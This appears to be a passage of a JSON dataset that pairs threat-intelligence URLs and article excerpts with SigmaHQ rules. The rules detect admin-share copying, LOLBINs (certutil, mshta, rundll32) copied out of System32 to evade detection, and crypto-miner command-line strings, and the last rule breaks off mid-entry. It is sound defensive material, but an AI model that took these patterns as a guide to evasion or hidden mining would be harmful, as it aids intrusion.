  },
  "515": {
    "url": "https://twitter.com/SBousseaden/status/1211636381086339073",
    "markdown": "",
    "sigma_rule": {
      "title": "Copy From Or To Admin Share Or Sysvol Folder",
      "id": "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
      "status": "test",
      "description": "Detects a copy command or a copy utility execution to or from an Admin share or remote",
      "references": [
        "https://twitter.com/SBousseaden/status/1211636381086339073",
        "https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view",
        "https://www.elastic.co/guide/en/security/current/remote-file-copy-to-a-hidden-share.html",
        "https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/"
      ],
      "author": "Florian Roth (Nextron Systems), oscd.community, Teymur Kheirkhabarov @HeirhabarovT, Zach Stanford @svch0st, Nasreddine Bencherchali",
      "date": "2019-12-30",
      "modified": "2023-11-15",
      "tags": [
        "attack.lateral-movement",
        "attack.collection",
        "attack.exfiltration",
        "attack.t1039",
        "attack.t1048",
        "attack.t1021.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_target": {
          "CommandLine|contains": [
            "\\\\\\\\*$",
            "\\Sysvol\\"
          ]
        },
        "selection_other_tools": [
          {
            "Image|endswith": [
              "\\robocopy.exe",
              "\\xcopy.exe"
            ]
          },
          {
            "OriginalFileName": [
              "robocopy.exe",
              "XCOPY.EXE"
            ]
          }
        ],
        "selection_cmd_img": [
          {
            "Image|endswith": "\\cmd.exe"
          },
          {
            "OriginalFileName": "Cmd.Exe"
          }
        ],
        "selection_cmd_cli": {
          "CommandLine|contains": "copy"
        },
        "selection_pwsh_img": [
          {
            "Image|contains": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_pwsh_cli": {
          "CommandLine|contains": [
            "copy-item",
            "copy ",
            "cpi ",
            " cp ",
            "move ",
            "move-item",
            " mi ",
            " mv "
          ]
        },
        "condition": "selection_target and (selection_other_tools or all of selection_cmd_* or all of selection_pwsh_*)"
      },
      "falsepositives": [
        "Administrative scripts"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_copy_lateral_movement.yml"
  },
  "516": {
    "url": "https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view",
    "markdown": "",
    "sigma_rule": {
      "title": "Copy From Or To Admin Share Or Sysvol Folder",
      "id": "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
      "status": "test",
      "description": "Detects a copy command or a copy utility execution to or from an Admin share or remote",
      "references": [
        "https://twitter.com/SBousseaden/status/1211636381086339073",
        "https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view",
        "https://www.elastic.co/guide/en/security/current/remote-file-copy-to-a-hidden-share.html",
        "https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/"
      ],
      "author": "Florian Roth (Nextron Systems), oscd.community, Teymur Kheirkhabarov @HeirhabarovT, Zach Stanford @svch0st, Nasreddine Bencherchali",
      "date": "2019-12-30",
      "modified": "2023-11-15",
      "tags": [
        "attack.lateral-movement",
        "attack.collection",
        "attack.exfiltration",
        "attack.t1039",
        "attack.t1048",
        "attack.t1021.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_target": {
          "CommandLine|contains": [
            "\\\\\\\\*$",
            "\\Sysvol\\"
          ]
        },
        "selection_other_tools": [
          {
            "Image|endswith": [
              "\\robocopy.exe",
              "\\xcopy.exe"
            ]
          },
          {
            "OriginalFileName": [
              "robocopy.exe",
              "XCOPY.EXE"
            ]
          }
        ],
        "selection_cmd_img": [
          {
            "Image|endswith": "\\cmd.exe"
          },
          {
            "OriginalFileName": "Cmd.Exe"
          }
        ],
        "selection_cmd_cli": {
          "CommandLine|contains": "copy"
        },
        "selection_pwsh_img": [
          {
            "Image|contains": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_pwsh_cli": {
          "CommandLine|contains": [
            "copy-item",
            "copy ",
            "cpi ",
            " cp ",
            "move ",
            "move-item",
            " mi ",
            " mv "
          ]
        },
        "condition": "selection_target and (selection_other_tools or all of selection_cmd_* or all of selection_pwsh_*)"
      },
      "falsepositives": [
        "Administrative scripts"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_copy_lateral_movement.yml"
  },
  "517": {
    "url": "https://www.elastic.co/guide/en/security/current/remote-file-copy-to-a-hidden-share.html",
    "markdown": "# Remote File Copy to a Hidden Share Identifies a remote file copy attempt to a hidden network share. This may indicate lateral movement or data staging activity. **Rule type**: eql **Rule indices**: - endgame-* - logs-crowdstrike.fdr* - logs-endpoint.events.process-* - logs-m365_defender.event-* - logs-sentinel_one_cloud_funnel.* - logs-system.security* - logs-windows.forwarded* - logs-windows.sysmon_operational-* - winlogbeat-* **Severity**: medium **Risk score**: 47 **Runs every**: 5m **Searches indices from**: now-9m (Date Math format, see also Additional look-back time) **Maximum alerts per execution**: 100 **References**: - https://www.elastic.co/security-labs/hunting-for-lateral-movement-using-event-query-language **Tags**: - Domain: Endpoint - OS: Windows - Use Case: Threat Detection - Tactic: Lateral Movement - Data Source: Elastic Endgame",
    "sigma_rule": {
      "title": "Copy From Or To Admin Share Or Sysvol Folder",
      "id": "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
      "status": "test",
      "description": "Detects a copy command or a copy utility execution to or from an Admin share or remote",
      "references": [
        "https://twitter.com/SBousseaden/status/1211636381086339073",
        "https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view",
        "https://www.elastic.co/guide/en/security/current/remote-file-copy-to-a-hidden-share.html",
        "https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/"
      ],
      "author": "Florian Roth (Nextron Systems), oscd.community, Teymur Kheirkhabarov @HeirhabarovT, Zach Stanford @svch0st, Nasreddine Bencherchali",
      "date": "2019-12-30",
      "modified": "2023-11-15",
      "tags": [
        "attack.lateral-movement",
        "attack.collection",
        "attack.exfiltration",
        "attack.t1039",
        "attack.t1048",
        "attack.t1021.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_target": {
          "CommandLine|contains": [
            "\\\\\\\\*$",
            "\\Sysvol\\"
          ]
        },
        "selection_other_tools": [
          {
            "Image|endswith": [
              "\\robocopy.exe",
              "\\xcopy.exe"
            ]
          },
          {
            "OriginalFileName": [
              "robocopy.exe",
              "XCOPY.EXE"
            ]
          }
        ],
        "selection_cmd_img": [
          {
            "Image|endswith": "\\cmd.exe"
          },
          {
            "OriginalFileName": "Cmd.Exe"
          }
        ],
        "selection_cmd_cli": {
          "CommandLine|contains": "copy"
        },
        "selection_pwsh_img": [
          {
            "Image|contains": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_pwsh_cli": {
          "CommandLine|contains": [
            "copy-item",
            "copy ",
            "cpi ",
            " cp ",
            "move ",
            "move-item",
            " mi ",
            " mv "
          ]
        },
        "condition": "selection_target and (selection_other_tools or all of selection_cmd_* or all of selection_pwsh_*)"
      },
      "falsepositives": [
        "Administrative scripts"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_copy_lateral_movement.yml"
  },
  "518": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/",
    "markdown": "# Defenders beware: A case for post-ransomware investigations **October 18, 2022** Ransomware is one of the most pervasive threats that Microsoft Detection and Response Team (DART) responds to today. The groups behind these attacks continue to add sophistication to their tactics, techniques, and procedures (TTPs) as most network security postures increase. In this blog, we detail a recent ransomware incident in which the attacker used a collection of commodity tools and techniques, such as using living-off-the-land binaries, to launch their malicious code. Cobalt Strike was used for persistence on the network with NT AUTHORITY/SYSTEM (local SYSTEM) privileges to maintain access",
    "sigma_rule": {
      "title": "Copy From Or To Admin Share Or Sysvol Folder",
      "id": "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
      "status": "test",
      "description": "Detects a copy command or a copy utility execution to or from an Admin share or remote",
      "references": [
        "https://twitter.com/SBousseaden/status/1211636381086339073",
        "https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view",
        "https://www.elastic.co/guide/en/security/current/remote-file-copy-to-a-hidden-share.html",
        "https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/"
      ],
      "author": "Florian Roth (Nextron Systems), oscd.community, Teymur Kheirkhabarov @HeirhabarovT, Zach Stanford @svch0st, Nasreddine Bencherchali",
      "date": "2019-12-30",
      "modified": "2023-11-15",
      "tags": [
        "attack.lateral-movement",
        "attack.collection",
        "attack.exfiltration",
        "attack.t1039",
        "attack.t1048",
        "attack.t1021.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_target": {
          "CommandLine|contains": [
            "\\\\\\\\*$",
            "\\Sysvol\\"
          ]
        },
        "selection_other_tools": [
          {
            "Image|endswith": [
              "\\robocopy.exe",
              "\\xcopy.exe"
            ]
          },
          {
            "OriginalFileName": [
              "robocopy.exe",
              "XCOPY.EXE"
            ]
          }
        ],
        "selection_cmd_img": [
          {
            "Image|endswith": "\\cmd.exe"
          },
          {
            "OriginalFileName": "Cmd.Exe"
          }
        ],
        "selection_cmd_cli": {
          "CommandLine|contains": "copy"
        },
        "selection_pwsh_img": [
          {
            "Image|contains": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_pwsh_cli": {
          "CommandLine|contains": [
            "copy-item",
            "copy ",
            "cpi ",
            " cp ",
            "move ",
            "move-item",
            " mi ",
            " mv "
          ]
        },
        "condition": "selection_target and (selection_other_tools or all of selection_cmd_* or all of selection_pwsh_*)"
      },
      "falsepositives": [
        "Administrative scripts"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_copy_lateral_movement.yml"
  },
  "519": {
    "url": "https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Copy From or To System Directory",
      "id": "fff9d2b7-e11c-4a69-93d3-40ef66189767",
      "related": [
        {
          "id": "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\nOften used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.\n",
      "references": [
        "https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120",
        "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
        "https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/"
      ],
      "author": "Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-07-03",
      "modified": "2023-08-29",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_cmd": {
          "Image|endswith": "\\cmd.exe",
          "CommandLine|contains": "copy "
        },
        "selection_pwsh": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains": [
            "copy-item",
            " copy ",
            "cpi ",
            " cp "
          ]
        },
        "selection_other": [
          {
            "Image|endswith": [
              "\\robocopy.exe",
              "\\xcopy.exe"
            ]
          },
          {
            "OriginalFileName": [
              "robocopy.exe",
              "XCOPY.EXE"
            ]
          }
        ],
        "target": {
          "CommandLine|contains": [
            "\\System32",
            "\\SysWOW64",
            "\\WinSxS"
          ]
        },
        "condition": "1 of selection_* and target"
      },
      "falsepositives": [
        "Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)",
        "When cmd.exe and xcopy.exe are called directly",
        "When the command contains the keywords but not in the correct order"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_copy_system_dir.yml"
  },
  "520": {
    "url": "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
    "markdown": "# SANNY Malware Delivery Method Updated in Recently Observed Attacks **March 23, 2018** ### Introduction In the third week of March 2018, through FireEye’s Dynamic Threat Intelligence, FireEye discovered malicious macro-based Microsoft Word documents distributing SANNY malware to multiple governments worldwide. Each malicious document lure was crafted in regard to relevant regional geopolitical issues. FireEye has tracked the SANNY malware family since 2012 and believes that it is unique to a group focused on Korean Peninsula issues. This group has consistently targeted diplomatic entities worldwide, primarily using lure documents written in English and Russian. As part of these recently observed",
    "sigma_rule": {
      "title": "Suspicious Copy From or To System Directory",
      "id": "fff9d2b7-e11c-4a69-93d3-40ef66189767",
      "related": [
        {
          "id": "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\nOften used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.\n",
      "references": [
        "https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120",
        "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
        "https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/"
      ],
      "author": "Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-07-03",
      "modified": "2023-08-29",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_cmd": {
          "Image|endswith": "\\cmd.exe",
          "CommandLine|contains": "copy "
        },
        "selection_pwsh": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains": [
            "copy-item",
            " copy ",
            "cpi ",
            " cp "
          ]
        },
        "selection_other": [
          {
            "Image|endswith": [
              "\\robocopy.exe",
              "\\xcopy.exe"
            ]
          },
          {
            "OriginalFileName": [
              "robocopy.exe",
              "XCOPY.EXE"
            ]
          }
        ],
        "target": {
          "CommandLine|contains": [
            "\\System32",
            "\\SysWOW64",
            "\\WinSxS"
          ]
        },
        "condition": "1 of selection_* and target"
      },
      "falsepositives": [
        "Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)",
        "When cmd.exe and xcopy.exe are called directly",
        "When the command contains the keywords but not in the correct order"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_copy_system_dir.yml"
  },
  "521": {
    "url": "https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/",
    "markdown": "# HTML Smuggling Leads to Domain Wide Ransomware **Categories:** adfind Attribution icedid nokoyawa ransomware **Published on:** August 28, 2023 --- We’ve previously reported on a Nokoyawa ransomware case in which the initial access was via an Excel macro and IcedID malware. This case, which also ended in Nokoyawa Ransomware, involved the threat actor deploying the final ransomware only 12 hours after the initial compromise. This threat actor delivered a password protected ZIP file via HTML smuggling to organizations back in late October, early November 2022. Within the password protected ZIP file, there was an ISO file that deployed IcedID which",
    "sigma_rule": {
      "title": "Suspicious Copy From or To System Directory",
      "id": "fff9d2b7-e11c-4a69-93d3-40ef66189767",
      "related": [
        {
          "id": "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\nOften used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.\n",
      "references": [
        "https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120",
        "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
        "https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/"
      ],
      "author": "Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-07-03",
      "modified": "2023-08-29",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_cmd": {
          "Image|endswith": "\\cmd.exe",
          "CommandLine|contains": "copy "
        },
        "selection_pwsh": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains": [
            "copy-item",
            " copy ",
            "cpi ",
            " cp "
          ]
        },
        "selection_other": [
          {
            "Image|endswith": [
              "\\robocopy.exe",
              "\\xcopy.exe"
            ]
          },
          {
            "OriginalFileName": [
              "robocopy.exe",
              "XCOPY.EXE"
            ]
          }
        ],
        "target": {
          "CommandLine|contains": [
            "\\System32",
            "\\SysWOW64",
            "\\WinSxS"
          ]
        },
        "condition": "1 of selection_* and target"
      },
      "falsepositives": [
        "Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)",
        "When cmd.exe and xcopy.exe are called directly",
        "When the command contains the keywords but not in the correct order"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_copy_system_dir.yml"
  },
  "522": {
    "url": "https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120",
    "markdown": "",
    "sigma_rule": {
      "title": "LOL-Binary Copied From System Directory",
      "id": "f5d19838-41b5-476c-98d8-ba8af4929ee2",
      "related": [
        {
          "id": "fff9d2b7-e11c-4a69-93d3-40ef66189767",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects a suspicious copy operation that tries to copy a known LOLBIN from system (System32, SysWOW64, WinSxS) directories to another on disk in order to bypass detections based on locations.\n",
      "references": [
        "https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120",
        "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
        "https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-08-29",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_tools_cmd": {
          "Image|endswith": "\\cmd.exe",
          "CommandLine|contains": "copy "
        },
        "selection_tools_pwsh": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains": [
            "copy-item",
            " copy ",
            "cpi ",
            " cp "
          ]
        },
        "selection_tools_other": [
          {
            "Image|endswith": [
              "\\robocopy.exe",
              "\\xcopy.exe"
            ]
          },
          {
            "OriginalFileName": [
              "robocopy.exe",
              "XCOPY.EXE"
            ]
          }
        ],
        "selection_target_path": {
          "CommandLine|contains": [
            "\\System32",
            "\\SysWOW64",
            "\\WinSxS"
          ]
        },
        "selection_target_lolbin": {
          "CommandLine|contains": [
            "\\bitsadmin.exe",
            "\\calc.exe",
            "\\certutil.exe",
            "\\cmdl32.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\rundll32.exe",
            "\\wscript.exe"
          ]
        },
        "condition": "1 of selection_tools_* and all of selection_target_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_copy_system_dir_lolbin.yml"
  },
  "523": {
    "url": "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
    "markdown": "# SANNY Malware Delivery Method Updated in Recently Observed Attacks **March 23, 2018** ### Introduction In the third week of March 2018, through FireEye’s Dynamic Threat Intelligence, FireEye discovered malicious macro-based Microsoft Word documents distributing SANNY malware to multiple governments worldwide. Each malicious document lure was crafted in regard to relevant regional geopolitical issues. FireEye has tracked the SANNY malware family since 2012 and believes that it is unique to a group focused on Korean Peninsula issues. This group has consistently targeted diplomatic entities worldwide, primarily using lure documents written in English and Russian. As part of these recently observed",
    "sigma_rule": {
      "title": "LOL-Binary Copied From System Directory",
      "id": "f5d19838-41b5-476c-98d8-ba8af4929ee2",
      "related": [
        {
          "id": "fff9d2b7-e11c-4a69-93d3-40ef66189767",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects a suspicious copy operation that tries to copy a known LOLBIN from system (System32, SysWOW64, WinSxS) directories to another on disk in order to bypass detections based on locations.\n",
      "references": [
        "https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120",
        "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
        "https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-08-29",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_tools_cmd": {
          "Image|endswith": "\\cmd.exe",
          "CommandLine|contains": "copy "
        },
        "selection_tools_pwsh": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains": [
            "copy-item",
            " copy ",
            "cpi ",
            " cp "
          ]
        },
        "selection_tools_other": [
          {
            "Image|endswith": [
              "\\robocopy.exe",
              "\\xcopy.exe"
            ]
          },
          {
            "OriginalFileName": [
              "robocopy.exe",
              "XCOPY.EXE"
            ]
          }
        ],
        "selection_target_path": {
          "CommandLine|contains": [
            "\\System32",
            "\\SysWOW64",
            "\\WinSxS"
          ]
        },
        "selection_target_lolbin": {
          "CommandLine|contains": [
            "\\bitsadmin.exe",
            "\\calc.exe",
            "\\certutil.exe",
            "\\cmdl32.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\rundll32.exe",
            "\\wscript.exe"
          ]
        },
        "condition": "1 of selection_tools_* and all of selection_target_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_copy_system_dir_lolbin.yml"
  },
  "524": {
    "url": "https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/",
    "markdown": "# HTML Smuggling Leads to Domain Wide Ransomware **Categories:** adfind Attribution icedid nokoyawa ransomware **Published on:** August 28, 2023 --- We’ve previously reported on a Nokoyawa ransomware case in which the initial access was via an Excel macro and IcedID malware. This case, which also ended in Nokoyawa Ransomware, involved the threat actor deploying the final ransomware only 12 hours after the initial compromise. This threat actor delivered a password protected ZIP file via HTML smuggling to organizations back in late October, early November 2022. Within the password protected ZIP file, there was an ISO file that deployed IcedID which",
    "sigma_rule": {
      "title": "LOL-Binary Copied From System Directory",
      "id": "f5d19838-41b5-476c-98d8-ba8af4929ee2",
      "related": [
        {
          "id": "fff9d2b7-e11c-4a69-93d3-40ef66189767",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects a suspicious copy operation that tries to copy a known LOLBIN from system (System32, SysWOW64, WinSxS) directories to another on disk in order to bypass detections based on locations.\n",
      "references": [
        "https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120",
        "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
        "https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-08-29",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_tools_cmd": {
          "Image|endswith": "\\cmd.exe",
          "CommandLine|contains": "copy "
        },
        "selection_tools_pwsh": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains": [
            "copy-item",
            " copy ",
            "cpi ",
            " cp "
          ]
        },
        "selection_tools_other": [
          {
            "Image|endswith": [
              "\\robocopy.exe",
              "\\xcopy.exe"
            ]
          },
          {
            "OriginalFileName": [
              "robocopy.exe",
              "XCOPY.EXE"
            ]
          }
        ],
        "selection_target_path": {
          "CommandLine|contains": [
            "\\System32",
            "\\SysWOW64",
            "\\WinSxS"
          ]
        },
        "selection_target_lolbin": {
          "CommandLine|contains": [
            "\\bitsadmin.exe",
            "\\calc.exe",
            "\\certutil.exe",
            "\\cmdl32.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\rundll32.exe",
            "\\wscript.exe"
          ]
        },
        "condition": "1 of selection_tools_* and all of selection_target_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_copy_system_dir_lolbin.yml"
  },
  "525": {
    "url": "https://web.archive.org/web/20220219012211/https://www.poolwatch.io/coin/monero",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Crypto Mining Activity",
      "id": "66c3b204-9f88-4d0a-a7f7-8a57d521ca55",
      "status": "stable",
      "description": "Detects command line parameters or strings often used by crypto miners",
      "references": [
        "https://web.archive.org/web/20220219012211/https://www.poolwatch.io/coin/monero"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2021-10-26",
      "modified": "2023-02-13",
      "tags": [
        "attack.impact",
        "attack.t1496"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            " --cpu-priority=",
            "--donate-level=0",
            " -o pool.",
            " --nicehash",
            " --algo=rx/0 ",
            "stratum+tcp://",
            "stratum+udp://",
            "LS1kb25hdGUtbGV2ZWw9",
            "0tZG9uYXRlLWxldmVsP",
            "tLWRvbmF0ZS1sZXZlbD",
            "c3RyYXR1bSt0Y3A6Ly",
            "N0cmF0dW0rdGNwOi8v",
            "zdHJhdHVtK3RjcDovL",
            "c3RyYXR1bSt1ZHA6Ly",
            "N0cmF0dW0rdWRwOi8v",
            "zdHJhdHVtK3VkcDovL"
          ]
        },
        "filter": {
          "CommandLine|contains": [
            " pool.c ",
            " pool.o ",
            "gcc -"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Legitimate use of crypto miners",
        "Some build frameworks"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_crypto_mining_monero.yml"
  },
  "526": {
    "url": "https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/",
    "markdown": "# Living Off Windows Defender | LockBit Ransomware Sideloads Cobalt Strike Through Microsoft Security Tool **July 28, 2022** --- LockBit has been receiving a fair share of attention recently. Last week, SentinelLabs reported on LockBit 3.0 (aka LockBit Black), describing how the latest iteration of this increasingly prevalent RaaS implemented a series of anti-analysis and anti-debugging routines. Our research was quickly followed up by others reporting similar findings. Meanwhile, back in April, SentinelLabs reported on how a LockBit affiliate was leveraging the legitimate VMware command line utility, `VMwareXferlogs.exe`, in a live engagement to side load Cobalt Strike. In this post,",
    "sigma_rule": {
      "title": "Potential Data Exfiltration Activity Via CommandLine Tools",
      "id": "7d1aaf3d-4304-425c-b7c3-162055e0b3ab",
      "status": "test",
      "description": "Detects the use of various CLI utilities exfiltrating data via web requests",
      "references": [
